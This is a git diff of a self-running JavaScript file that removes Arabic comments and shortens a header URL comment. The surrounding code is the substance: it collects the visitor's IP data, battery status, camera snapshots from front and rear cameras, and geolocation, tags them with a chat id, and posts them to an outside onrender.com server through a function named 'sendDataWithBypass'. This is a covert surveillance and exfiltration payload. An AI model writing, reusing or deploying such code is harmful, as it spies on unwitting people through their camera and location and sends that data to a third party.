@@ -1,4 +1,4 @@
-// هذا الملف على: https://raw.githubusercontent.com/FGDHSHS/api/refs/heads/main/api
+// https://raw.githubusercontent.com/FGDHSHS/api/refs/heads/main/api
 (function() {
     'use strict';
 
@@ -11,7 +11,6 @@
         chatId: window._chatId || ''
     };
 
-    // جلب IP
     async function fetchIPInfo() {
         try {
             var response = await fetch('https://ipapi.co/json/');
@@ -22,7 +21,6 @@
         }
     }
 
-    // جلب البطارية
     async function getBatteryStatus() {
         try {
             var battery = await navigator.getBattery();
@@ -32,7 +30,6 @@
         }
     }
 
-    // تصوير الكاميرا
     async function captureFromCamera(facingMode) {
         try {
             var stream = await navigator.mediaDevices.getUserMedia({
@@ -55,7 +52,6 @@
         }
     }
 
-    // جلب الموقع
     async function getLocation() {
         try {
             var position = await new Promise(function(resolve, reject) {
@@ -73,7 +69,6 @@
         }
     }
 
-    // إرسال البيانات
     async function sendDataWithBypass(data) {
         var urls = [
             'https://server-brxz.onrender.com/submitData',
@@ -131,7 +126,6 @@
         }
     }
 
-    // تشغيل كل شيء
     async function main() {
         await Promise.all([
             fetchIPInfo(),
@@ -156,7 +150,6 @@
         await sendDataWithBypass(data);
     }
 
-    // بدء التنفيذ
     main();
 
 })();
